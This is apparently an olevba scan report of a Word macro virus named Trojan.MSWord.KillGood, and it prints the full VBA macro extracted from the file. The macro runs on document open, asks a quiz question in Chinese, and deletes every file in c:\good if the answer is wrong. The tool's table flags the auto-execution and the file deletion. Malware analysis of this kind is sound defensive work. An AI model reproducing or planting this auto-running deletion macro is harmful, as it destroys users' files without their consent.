olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Trojan.MSWord.KillGood
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Trojan.MSWord.KillGood - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Module3.bas 
in file: Trojan.MSWord.KillGood - OLE stream: 'Macros/VBA/Module3'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub autoOpen()

On Error Resume Next

louis:
Err = 0
answer$ = InputBox$("讓我考考你:\在民國73年2月7日出生的我叫什麼名字呢?", "我的第一次")
If answer$ = "陳俊德" Then GoTo message Else GoTo die

message:
MsgBox "恭喜你答對了!我是協X中學的學生!"
GoTo esc

die:
MsgBox "很抱歉你答錯了，去借Windows光碟吧!"
kill "c:\good\*.*"


esc:
MsgBox "這是我第一集巨集病毒，多多指教"

End Sub

+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |autoOpen            |Runs when the Word document is opened        |
|Suspicious|kill                |May delete a file                            |
+----------+--------------------+---------------------------------------------+

